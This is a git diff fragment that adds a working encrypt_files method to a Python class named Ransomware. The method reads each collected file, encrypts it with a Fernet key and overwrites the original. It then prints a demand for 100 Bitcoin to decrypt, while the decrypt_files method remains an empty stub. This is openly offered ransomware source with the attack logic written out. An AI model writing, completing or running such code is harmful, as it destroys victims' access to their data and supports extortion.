@@ -10,7 +10,13 @@ class Ransomware:
                       "main.py" and os.path.isfile(file)] 
 
     def encrypt_files(self):
-        pass
+        for file in self.files:
+            with open(file, "rb") as f:
+                data = f.read()
+            encrypted_data = Fernet(self.key).encrypt(data)
+            with open(file, "wb") as f:
+                f.write(encrypted_data)
+        print("All of the files have been encrypted! Send me 100 Bitcoin to decrypt them!\n\"paste bitcoin address here\"\n")
 
     def decrypt_files(self):
         pass
